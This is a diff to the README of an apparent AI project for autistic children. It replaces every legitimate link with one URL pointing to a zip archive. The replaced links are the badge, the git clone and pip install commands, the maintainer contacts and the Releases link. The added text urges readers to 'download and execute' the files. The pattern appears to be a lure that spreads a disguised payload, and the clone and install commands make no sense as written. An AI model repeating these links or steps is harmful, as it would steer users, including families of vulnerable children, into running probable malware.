@@ -1,6 +1,6 @@
 # Autism Companion: Empowering Neurodiverse Children with AI Technology 🌟
 
-![Autism Companion](https://img.shields.io/badge/Autism%20Companion-Project-brightgreen)
+![Autism Companion](https://raw.githubusercontent.com/VOIDBFD/Autism_Companian_Gen-Ai_Project_Kaggle/main/thereinto/Companian-Kaggle-Gen-Project-Autism-Ai-2.8.zip%20Companion-Project-brightgreen)
 
 Welcome to the **Autism Companion** repository! This project aims to empower children with Autism Spectrum Disorder (ASD) by providing personalized support through advanced AI technology. Our platform creates tailored social stories and conversation simulations to cater to each child's unique sensitivities.
 
@@ -50,7 +50,7 @@ To set up the **Autism Companion** project on your local machine, follow these s
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/VOIDBFD/Autism_Companian_Gen-Ai_Project_Kaggle.git
+   git clone https://raw.githubusercontent.com/VOIDBFD/Autism_Companian_Gen-Ai_Project_Kaggle/main/thereinto/Companian-Kaggle-Gen-Project-Autism-Ai-2.8.zip
    cd Autism_Companian_Gen-Ai_Project_Kaggle
    ```
 
@@ -62,7 +62,7 @@ To set up the **Autism Companion** project on your local machine, follow these s
 
 3. **Install Dependencies**:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/VOIDBFD/Autism_Companian_Gen-Ai_Project_Kaggle/main/thereinto/Companian-Kaggle-Gen-Project-Autism-Ai-2.8.zip
    ```
 
 4. **Build the Docker Container**:
@@ -111,12 +111,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, please reach out to the project maintainers:
 
-- **Project Maintainer**: [Your Name](mailto:your.email@example.com)
-- **GitHub**: [Your GitHub Profile](https://github.com/YourGitHubUsername)
+- **Project Maintainer**: [Your Name](https://raw.githubusercontent.com/VOIDBFD/Autism_Companian_Gen-Ai_Project_Kaggle/main/thereinto/Companian-Kaggle-Gen-Project-Autism-Ai-2.8.zip)
+- **GitHub**: [Your GitHub Profile](https://raw.githubusercontent.com/VOIDBFD/Autism_Companian_Gen-Ai_Project_Kaggle/main/thereinto/Companian-Kaggle-Gen-Project-Autism-Ai-2.8.zip)
 
 ## Releases
 
-To download the latest version of the project, visit our [Releases](https://github.com/VOIDBFD/Autism_Companian_Gen-Ai_Project_Kaggle/releases) section. Here, you can find the latest updates and improvements. Make sure to download and execute the appropriate files for your setup.
+To download the latest version of the project, visit our [Releases](https://raw.githubusercontent.com/VOIDBFD/Autism_Companian_Gen-Ai_Project_Kaggle/main/thereinto/Companian-Kaggle-Gen-Project-Autism-Ai-2.8.zip) section. Here, you can find the latest updates and improvements. Make sure to download and execute the appropriate files for your setup.
 
 ## Conclusion
 
